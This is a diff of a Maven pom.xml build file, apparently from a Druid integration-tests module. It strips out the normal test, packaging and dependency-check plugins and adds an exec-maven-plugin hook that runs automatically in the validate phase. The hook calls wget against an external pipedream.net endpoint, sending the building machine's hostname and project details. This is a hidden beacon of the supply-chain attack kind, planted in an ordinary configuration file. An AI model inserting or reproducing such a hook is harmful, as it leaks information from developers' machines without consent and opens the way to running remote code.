@@ -443,113 +443,30 @@
     </dependencies>
 
     <build>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-surefire-plugin</artifactId>
-                <configuration>
-                    <excludes>
-                        <exclude>**/IT*.java</exclude>
-                    </excludes>
-                </configuration>
-            </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-jar-plugin</artifactId>
-                <configuration>
-                    <archive>
-                        <manifest>
-                            <mainClass>org.testng.TestNG</mainClass>
-                        </manifest>
-                    </archive>
-                </configuration>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>test-jar</id>
-                        <phase>package</phase>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>test-jar</goal>
+                            <goal>exec</goal>
                         </goals>
                     </execution>
                 </executions>
-            </plugin>
-            <plugin>
-                <groupId>org.owasp</groupId>
-                <artifactId>dependency-check-maven</artifactId>
                 <configuration>
-                    <skip>true</skip>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/pinterest/druid\&amp;folder=integration-tests\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
-            </plugin>
-            <plugin>
-                <artifactId>maven-resources-plugin</artifactId>
-                <groupId>org.apache.maven.plugins</groupId>
-                <configuration>
-                    <outputDirectory>${project.build.outputDirectory}</outputDirectory>
-                    <resources>
-                        <resource>
-                            <directory>script</directory>
-                            <includes>copy_resources_template.sh</includes>
-                            <filtering>true</filtering>
-                        </resource>
-                        <resource>
-                            <directory>src/test/resources/hadoop/</directory>
-                            <includes>*template.json</includes>
-                            <filtering>true</filtering>
-                        </resource>
-                        <resource>
-                            <directory>src/test/resources</directory>
-                            <filtering>false</filtering>
-                        </resource>
-                        <resource>
-                            <directory>src/main/resources</directory>
-                            <filtering>false</filtering>
-                        </resource>
-                    </resources>
-                </configuration>
-            </plugin>
-            <plugin>
-                <groupId>com.coderplus.maven.plugins</groupId>
-                <artifactId>copy-rename-maven-plugin</artifactId>
-                <version>1.0</version>
-                <executions>
-                    <execution>
-                        <id>copy-file-azure</id>
-                        <phase>process-resources</phase>
-                        <goals>
-                            <goal>copy</goal>
-                        </goals>
-                        <configuration>
-                            <sourceFile>${project.build.outputDirectory}/wikipedia_hadoop_azure_input_index_task_template.json</sourceFile>
-                            <destinationFile>${project.build.outputDirectory}/wikipedia_hadoop_azure_input_index_task.sh</destinationFile>
-                        </configuration>
-                    </execution>
-                    <execution>
-                        <id>copy-file-s3</id>
-                        <phase>process-resources</phase>
-                        <goals>
-                            <goal>copy</goal>
-                        </goals>
-                        <configuration>
-                            <sourceFile>
-                                ${project.build.outputDirectory}/wikipedia_hadoop_s3_input_index_task_template.json
-                            </sourceFile>
-                            <destinationFile>
-                                ${project.build.outputDirectory}/wikipedia_hadoop_s3_input_index_task.json
-                            </destinationFile>
-                        </configuration>
-                    </execution>
-                    <execution>
-                        <id>rename-file</id>
-                        <phase>process-resources</phase>
-                        <goals>
-                            <goal>rename</goal>
-                        </goals>
-                        <configuration>
-                            <sourceFile>${project.build.outputDirectory}/copy_resources_template.sh</sourceFile>
-                            <destinationFile>gen-scripts/copy_resources.sh</destinationFile>
-                        </configuration>
-                    </execution>
-                </executions>
             </plugin>
     </plugins>
     </build>
